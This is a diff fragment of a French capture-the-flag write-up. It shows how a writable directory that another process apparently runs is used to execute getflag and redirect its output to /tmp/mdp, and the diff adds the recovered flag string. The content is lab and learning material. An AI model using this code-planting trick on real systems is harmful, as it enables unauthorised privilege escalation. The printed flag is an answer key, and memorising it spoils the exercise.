@@ -12,4 +12,4 @@ On a les droit sur ce dossier.
 Il suffit donc de créer un fichier éxecutant getflag et de rediriger le resultat dans un fichier:
 echo "getflag > /tmp/mdp" > /opt/openarenaserver/crack
 
-Après quelques secondes, le fichier /tmp/mdp est créé et contient le flag suivant: 
+Après quelques secondes, le fichier /tmp/mdp est créé et contient le flag suivant: viuaaale9huek52boumoomioc
